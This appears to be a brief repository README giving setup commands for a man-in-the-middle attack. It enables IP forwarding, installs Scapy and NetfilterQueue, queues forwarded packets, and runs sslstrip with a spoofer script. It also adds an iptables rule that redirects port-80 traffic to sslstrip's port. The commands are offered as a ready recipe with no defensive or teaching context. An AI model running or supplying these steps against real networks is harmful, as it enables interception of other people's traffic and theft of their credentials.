# final-program
All final program for play


echo 1 > /proc/sys/net/ipv4/ip_forward


How to install Scapy :  https://www.youtube.com/watch?v=3tkVKflR4rY


How to install netfilterqueue:
    apt-get update
    apt-get install build-essential python-dev libnetfilter-queue-dev
    pip install NetfilterQueue


   iptables -I FORWARD -j NFQUEUE --queue-num 0 
   iptables --flush


service apache2 start


run sslstrip
run python spoofer.py
run iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
